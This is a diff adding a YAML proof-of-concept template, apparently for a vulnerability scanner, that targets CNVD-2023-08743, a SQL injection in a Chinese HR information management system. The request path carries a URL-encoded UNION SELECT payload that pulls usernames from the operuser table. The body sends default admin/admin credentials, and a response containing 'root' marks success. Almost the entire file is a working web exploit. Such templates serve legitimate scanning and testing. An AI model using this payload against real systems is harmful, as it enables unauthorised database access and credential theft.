@@ -1,0 +1,12 @@
+name: poc-yaml-人力资源信息管理系统-CNVD-2023-08743
+description: "SQL注入"
+method: GET
+body: "op=verify%7Clogin&targetpage=&errorpage=WEB-INF/web.xml&mark=&tzo=480&username=admin&password=admin"
+headers:
+  Content-Type: "application/x-www-form-urlencoded"
+path:
+  - /servlet/codesettree?flag=c&status=1&codesetid=1&parentid=-1&categories=~31~27~20union~20all~20select~20~27~31~27~2cusername~20from~20operuser~20~2d~2d
+expression:
+  status: 200
+  body_all:
+    - "root"
